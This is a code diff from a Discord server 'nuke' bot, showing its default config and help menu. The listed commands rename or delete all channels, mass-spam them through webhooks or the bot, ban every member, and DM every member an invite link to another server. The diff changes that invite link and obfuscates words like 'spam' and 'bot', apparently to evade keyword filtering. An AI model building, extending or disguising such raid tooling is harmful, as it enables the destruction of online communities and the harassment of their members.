@@ -14,9 +14,9 @@ DEFAULT_CONFIG = {
     "channels": 500,
     "channel-name": "cturnal",
     "pings": 15,
-    "server-name": "moving servers",
+    "server-name": "moving to /chrxmaticc",
     "webhook-name": "disc",
-    "message": "Moving servers: https://discord.gg/uSCXAJsTM4  @everyone"
+    "message": "moving servers: https://discord.gg/chrxmaticc  @everyone"
 }
 
 def parse_inline_config(content):
@@ -56,12 +56,12 @@ async def help_command(ctx):
     help_text = (
         "> **Available Commands:**\n\n"
         "> `,help` - Displays this breakdown menu\n"
-        "> `,nuke1` - Rename all channels and use webhooks to spam them\n"
-        "> `,nuke2` - Rename all channels and use the bot to spam them\n"
-        "> `,nuke3` - Do not rename channels and use webhooks to spam every channel\n"
-        "> `,nuke4` - Do not rename channels and use the bot to spam every channel\n"
+        "> `,nuke1` - Rename all channels and use webhooks to sp*m them\n"
+        "> `,nuke2` - Rename all channels and use the bot to sp*m them\n"
+        "> `,nuke3` - Do not rename channels and use webhooks to sp*m every channel\n"
+        "> `,nuke4` - Do not rename channels and use the bot to sp*m every channel\n"
         "> `,nuke5` - Delete all channels, create new ones, and use webhooks t spam\n"
-        "> `,nuke6` - Delete all channels, create new ones, and use bot to spam\n"
+        "> `,nuke6` - Delete all channels, create new ones, and use b0t to spam\n"
         "> `,banall` - Ban all members from the server\n"
         "> `,dmall` - DM all members with a relocation link\n\n"
         "> **Inline Config Example:**\n"
